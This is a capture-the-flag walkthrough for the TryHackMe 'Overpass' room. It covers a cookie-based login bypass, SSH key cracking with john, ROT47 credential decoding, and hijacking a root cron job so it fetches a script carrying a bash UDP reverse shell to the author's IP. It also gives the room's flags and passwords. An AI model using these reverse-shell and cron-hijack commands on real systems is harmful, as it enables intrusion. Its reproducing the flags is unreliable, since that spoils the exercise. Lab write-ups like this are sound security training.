# Overpass
https://tryhackme.com/room/overpass

##  Hack the machine and get the flag in user.txt 
nmap scan returns port 22 & 80
website is hosted on 80
gobuster has found a directory: /admin
login screen with available login.js script visible that checks to see if a cookie has been set so we can set out own in console. `Cookies.set("SessionToken", statusOrCookie)` then refresh the page.

We now have a private key and a username "James" exposed by a message on the site.

This private key is projected by a password, so we're going to use ssh2john
`python3 ssh2john.py <privatekey> > hash.txt`
`john hash.txt --wordlist=<rockyou dir> --format=SSH`

SSH password: james13

Flag in user.txt
thm{65c1aaf000506e56996822c6281e6bf7}

## Escalate your privileges and get the flag in root.txt
in todo.txt that notes there's an automated build script running, weak encryption.

On downloads page there's the source for the password manager
http://<ip>/downloads/src/overpass.go

In the main() function it runs the code: `credsPath, err := homedir.Expand("~/.overpass")`
Which indicates that there are credentials stored in the .overpass file within a user's home directory.
Inside the james's user directory there's a .overpass file that contains the following:
_,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN._

Again, within the overpass.go source the main function calls another function called "loadCredsFromFile" which then calls a function called "rot47". This is a simple caeser substitution cypher that can easily be undone.

I used cyber chef and ROT47 to get some JSON data
https://gchq.github.io/CyberChef/#recipe=ROT47(47)&input=LExRPzI%2BNlFpUSRKREU2PlFbUUEyRERRaVFEMko1QzJIPz1KOj84QTo0RUZDNlFOLg  
`[{"name":"System","pass":"saydrawnlyingpicture"}]`

I can assume that "saydrawnlyingpicture" is James's password. The user can't run any sudo commands so this is useless.

I then starty looking into the note on an automated script which normally means a cronjob.
`crontab -l` returns no crontabs for the user james, however when checking /etc/crontab we can see a crontab
```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This references the buildscript that is on the download's page. As this uses a vhost I decide to edit the /etc/hosts file to change the script to connect to my IP instead.

I create a file called downloads/src/buildscript.sh on my local machine with the below contents
Bash UDP Reverse Shell: `sh -i >& /dev/udp/<my IP>/4242 0>&1` then ran the command `nc -u -lvp 4242` on my machine to start a listener.

I then started a HTTP Server on my machine so the victim could curl my file and run it.
`sudo python3 -m http.server 80 --bind 10.9.180.40`

Once the victim downloaded the file and executed, I was able to establish a reverse shell connection using my netcat listener and from there I have root access.

I could also have created a script that read the contents of the root flag file then wrote them to the james user, however I wanted to be able to control this root user completely.
